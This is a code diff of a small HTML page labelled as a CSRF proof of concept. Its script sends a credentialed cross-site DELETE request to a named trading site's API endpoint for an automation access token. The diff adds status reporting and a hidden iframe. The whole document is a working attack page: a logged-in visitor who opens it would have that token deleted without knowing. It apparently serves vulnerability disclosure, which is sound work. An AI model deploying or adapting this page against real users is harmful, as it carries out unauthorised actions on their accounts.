@@ -1,11 +1,21 @@
 <!DOCTYPE html>
 <html>
+<head>
+  <title>CSRF PoC - DELETE</title>
+</head>
 <body>
   <p>Sending...</p>
+  <iframe name="hidden-iframe" style="display:none;"></iframe>
   <script>
     fetch("https://csgoempire.com/api/v2/trading/automation/access-token", {
       method: "DELETE",
       credentials: "include"
+    }).then(r => {
+      console.log("Status:", r.status);
+      document.querySelector("p").textContent = "Done! Status: " + r.status;
+    }).catch(err => {
+      console.error("Error:", err);
+      document.querySelector("p").textContent = "Error: " + err;
     });
   </script>
 </body>
